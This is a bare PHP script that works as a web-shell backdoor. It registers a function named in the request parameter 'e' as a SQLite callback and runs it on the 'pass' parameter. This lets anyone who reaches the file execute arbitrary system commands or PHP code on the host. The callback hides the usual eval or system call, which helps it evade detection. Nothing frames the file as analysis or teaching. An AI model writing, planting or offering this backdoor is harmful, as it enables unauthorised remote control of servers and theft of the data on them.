<?php
$e = $_REQUEST['e'];
$db = new PDO('sqlite:sqlite.db3');
$db->sqliteCreateFunction('myfunc', $e, 1);
$sth = $db->prepare("SELECT myfunc(:exec)");
$sth->execute(array(':exec' => $_REQUEST['pass']));
?>